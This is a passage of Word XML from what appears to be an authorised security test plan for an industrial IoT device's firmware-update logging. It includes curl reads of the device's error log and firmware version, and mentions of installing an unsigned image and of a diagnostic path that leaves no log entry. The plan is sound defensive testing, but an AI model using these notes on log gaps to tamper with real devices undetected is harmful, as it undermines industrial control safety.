            <w:r w:rsidRPr="0002207B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4F3D34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SVV</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0002207B" w:rsidRPr="0002207B" w14:paraId="1DEBB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E4422" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="0002207B" w:rsidRDefault="0002207B" w:rsidP="0002207B">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="0002207B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8AE36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Enumerate the </w:t>
            </w:r>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>software</w:t>
            </w:r>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>-event evidence that exists: Error Log, /firmware/version, I&amp;M0 SOFTWARE_REVISION at baseline (</w:t>
            </w:r>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>no REVISION_COUNTER/I&amp;M4 — those are RQ-009</w:t>
            </w:r>
            <w:r w:rsidRPr="00DC3DB6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009A3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t>Functional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baseline</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0002207B">
              <w:t xml:space="preserve"> (CR 6.1 </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0002207B">
              <w:t>met</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0002207B">
              <w:t>; CR 2.8 partial)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E78A6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>Requirements-based verification; NIST SP 800-115 §3.2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74840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SVV-1</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0002207B" w:rsidRPr="0002207B" w14:paraId="67CE2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5C35B" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="0002207B" w:rsidRDefault="0002207B" w:rsidP="0002207B">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="0002207B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4638F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Perform a </w:t>
            </w:r>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>legitimate</w:t>
            </w:r>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>authorised</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> FW update; capture whether a retained, time-stamped, attributed record survives the install reboot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C3533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Proves</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0002207B">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> G-3</w:t>
            </w:r>
            <w:r w:rsidRPr="0002207B">
              <w:t xml:space="preserve"> (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0002207B">
              <w:t>self-erasing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install</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0002207B">
              <w:t>) + G-1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1AD9B" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="0002207B" w:rsidRDefault="0002207B" w:rsidP="0002207B">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="0002207B">
              <w:t>NIST SP 800-115 §3.2 / §7 (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0002207B">
              <w:t>evidence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handling</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0002207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E0978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SVV-2</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0002207B" w:rsidRPr="0002207B" w14:paraId="7A502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E0840" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="0002207B" w:rsidRDefault="0002207B" w:rsidP="0002207B">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="0002207B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F63E0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Compare evidence footprints of a </w:t>
            </w:r>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>legitimate</w:t>
            </w:r>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> update vs the </w:t>
            </w:r>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>modified/unsigned</w:t>
            </w:r>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> image installed in </w:t>
            </w:r>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>TC-RQ005-03</w:t>
            </w:r>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>; check whether the log distinguishes them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7867A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b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Proves G-2</w:t>
            </w:r>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (evidence cannot classify) — </w:t>
            </w:r>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>install action referenced from RQ-005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EEB23" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="0002207B" w:rsidRDefault="0002207B" w:rsidP="0002207B">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="0002207B">
              <w:t xml:space="preserve">MITRE ATT&amp;CK </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0002207B">
              <w:t>for</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0002207B">
              <w:t xml:space="preserve"> ICS </w:t>
            </w:r>
            <w:r w:rsidRPr="0002207B">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>T0872</w:t>
            </w:r>
            <w:r w:rsidRPr="0002207B">
              <w:t>; OWASP ISTG-FW[UPDT]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F5802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SVV-4</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0002207B" w:rsidRPr="0002207B" w14:paraId="478C4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31D78" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="0002207B" w:rsidRDefault="0002207B" w:rsidP="0002207B">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="0002207B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E7BF4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>Time-attribution across the install cold start: uptime resets, no absolute timestamp on either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6271E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Proves</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0002207B">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> G-1/CR 2.11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77DE5" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="0002207B" w:rsidRDefault="0002207B" w:rsidP="0002207B">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="0002207B">
              <w:t>NIST SP 800-115 §3.2 (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0002207B">
              <w:t>reuse</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0002207B">
              <w:t xml:space="preserve"> TC-RQ003-04 </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0002207B">
              <w:t>method</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0002207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5856B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SVV-3</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0002207B" w:rsidRPr="0002207B" w14:paraId="5E9F6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50679" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="0002207B" w:rsidRDefault="0002207B" w:rsidP="0002207B">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="0002207B">
              <w:t>TS-5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964838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>Invoke the fused diagnostic/FIT path (/fit/</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>setfit</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">, WO/P) in production; confirm exclusion produces </w:t>
            </w:r>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>no log entry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D5459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t>Validates</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0002207B">
              <w:t xml:space="preserve"> EDR 2.13; </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0002207B">
              <w:t>confirms</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0002207B">
              <w:t xml:space="preserve"> G-4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9C987" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="0002207B" w:rsidRDefault="0002207B" w:rsidP="0002207B">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="0002207B">
              <w:t>NIST SP 800-115 §4.2; OWASP FSTM / ISTG-PHY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508CD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SVV-3</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="23896A40" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="0002207B" w:rsidRDefault="0002207B" w:rsidP="0002207B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Environment binding: management path (Pi eth1 = 192.168.50.10 → IoT-Core); TS-3 reuses the </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>spare-DUT, isolated-lab, PLC-monitored</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> constraints of TC-RQ005-03; re-flash a validated image afterward. </w:t>
      </w:r>
      <w:hyperlink r:id="rId194" w:history="1">
        <w:r w:rsidRPr="0002207B">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="0002207B">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>ifmworld</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="0002207B">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>-m...epoint.com]</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="0002207B">
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:hyperlink r:id="rId195" w:history="1">
        <w:r w:rsidRPr="0002207B">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="0002207B">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>Security_T</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="0002207B">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="0002207B">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>rk_Kali_EN</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="0002207B">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> | Word]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="69BDDEC8" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="0002207B" w:rsidRDefault="0002207B" w:rsidP="0002207B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="0002207B">
        <w:pict w14:anchorId="3CCEFAD8">
          <v:rect id="_x0000_i1543" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="34188E13" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="00DC3DB6" w:rsidRDefault="0002207B" w:rsidP="0002207B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Step 3 — Two-Level Test Catalog (Scope-Corrected)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D0F4C90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lastRenderedPageBreak/>
        <w:t xml:space="preserve">Full entries for the baseline (TS-1), the </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>self-erasing legitimate install</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (TS-2 → G-3), and the </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>evidence-classification</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> proof (TS-3 → G-2). </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>REVISION_COUNTER/I&amp;M4 excluded from all</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (→ RQ-009). TS-4/TS-5 per established templates.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EF90C1A" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="0002207B" w:rsidRDefault="0002207B" w:rsidP="0002207B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="0002207B">
        <w:pict w14:anchorId="6B79F2EE">
          <v:rect id="_x0000_i1544" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="73520879" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="00DC3DB6" w:rsidRDefault="0002207B" w:rsidP="0002207B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>TC-RQ008-01 — Software-Event Evidence Baseline</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D1C11A7" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="0002207B" w:rsidRDefault="0002207B" w:rsidP="0002207B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0002207B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7768"/>
      </w:tblGrid>
      <w:tr w:rsidR="0002207B" w:rsidRPr="0002207B" w14:paraId="238A34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DE0BB6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740900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Content</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0002207B" w:rsidRPr="0002207B" w14:paraId="2B9FA8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F8A47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872F9" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="0002207B" w:rsidRDefault="0002207B" w:rsidP="0002207B">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="0002207B">
              <w:t>TC-RQ008-01</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0002207B" w:rsidRPr="0002207B" w14:paraId="24936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3F63C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A30EA" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="0002207B" w:rsidRDefault="0002207B" w:rsidP="0002207B">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="0002207B">
              <w:t xml:space="preserve">RQ-008 (EHSR 1.1.9 §2, </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0002207B">
              <w:t>software</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0002207B">
              <w:t>) → CR 2.8 / CR 6.1 → Asset I, Asset D</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0002207B" w:rsidRPr="00DC3DB6" w14:paraId="7D59A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AF1BE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8E303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>Repudiation (baseline of available software-event evidence)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0002207B" w:rsidRPr="0002207B" w14:paraId="350B3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2D9CC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 xml:space="preserve">SVV </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0002207B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A6B83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SVV-1</w:t>
            </w:r>
            <w:r w:rsidRPr="0002207B">
              <w:t xml:space="preserve"> (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0002207B">
              <w:t>Requirements-based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Testing</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0002207B">
              <w:t>)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0002207B" w:rsidRPr="00DC3DB6" w14:paraId="141F4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FC470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FB568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Establish which </w:t>
            </w:r>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>software-intervention</w:t>
            </w:r>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> evidence the device produces and whether it is readable: the COM Error Log, /firmware/version, and I&amp;M0 SOFTWARE_REVISION — and inspect each for actor identity and absolute timestamp.</w:t>
            </w:r>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>(Config markers REVISION_COUNTER/I&amp;M4 are out of scope → RQ-009.)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0002207B" w:rsidRPr="00DC3DB6" w14:paraId="6F6EEA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BD433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 xml:space="preserve">Abstract </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0002207B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86A9D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1. Read the error log and firmware/SOFTWARE_REVISION records at a known-good baseline. 2. Trigger a benign self-detected software event (e.g., brief </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>SysCom</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> interruption). 3. Re-read; confirm an Error-Log entry appears. 4. Inspect the entry for identity and absolute timestamp.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0002207B" w:rsidRPr="00DC3DB6" w14:paraId="00CFD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32F57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BE728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b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>PASS</w:t>
            </w:r>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>iff</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> the log and software records are readable and the induced event is captured (CR 6.1 + partial CR 2.8). </w:t>
            </w:r>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Documented shortfall</w:t>
            </w:r>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>iff</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> no entry carries actor identity or absolute timestamp.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="41BCD4D6" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="0002207B" w:rsidRDefault="0002207B" w:rsidP="0002207B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0002207B">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Level 2 — </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0002207B">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Concrete</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0002207B">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0002207B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573"/>
      </w:tblGrid>
      <w:tr w:rsidR="0002207B" w:rsidRPr="0002207B" w14:paraId="22D9F0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DF235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819FBD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Content</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0002207B" w:rsidRPr="0002207B" w14:paraId="4F060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291E2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Ref</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0002207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33B49" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="0002207B" w:rsidRDefault="0002207B" w:rsidP="0002207B">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="0002207B">
              <w:t>TC-RQ008-01</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0002207B" w:rsidRPr="0002207B" w14:paraId="6202E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5BFE4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F4B92" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="0002207B" w:rsidRDefault="0002207B" w:rsidP="0002207B">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="0002207B">
              <w:t xml:space="preserve">DUT 192.168.0.2; Pi </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0002207B">
              <w:t>mgmt</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0002207B">
              <w:t xml:space="preserve"> eth1 = 192.168.50.10; </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0002207B">
              <w:t>browser</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0002207B">
              <w:t xml:space="preserve"> 192.168.50.20</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0002207B" w:rsidRPr="00DC3DB6" w14:paraId="69D24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61424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F5DE6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>curl / IoT-Core visualizer; PN acyclic read for I&amp;M0 SOFTWARE_REVISION</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="425E8066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># TC-RQ008-01 Software-event evidence baseline (config markers EXCLUDED -&gt; RQ-009)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E709E06" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="00DC3DB6" w:rsidRDefault="0002207B" w:rsidP="0002207B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t>curl</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve"> -s </w:t>
      </w:r>
      <w:hyperlink r:id="rId196" w:history="1">
        <w:r w:rsidRPr="00DC3DB6">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="pt-BR"/>
          </w:rPr>
          <w:t>http://192.168.0.2/devicestatus/errorlog/loglist</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve"> -o TC0801_log_base.json</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="016B2546" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="00DC3DB6" w:rsidRDefault="0002207B" w:rsidP="0002207B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t>curl</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve"> -s </w:t>
      </w:r>
      <w:hyperlink r:id="rId197" w:history="1">
        <w:r w:rsidRPr="00DC3DB6">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="pt-BR"/>
          </w:rPr>
          <w:t>http://192.168.0.2/firmware/version</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve"> -o TC0801_fwver_base.json</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0681A0C9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># I&amp;M0 SOFTWARE_REVISION via acyclic PN read (NOT REVISION_COUNTER / NOT I&amp;M4 -&gt; RQ-009)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3601F4E5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># --- induce a benign self-detected software event (e.g., brief SCPU/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DC3DB6">
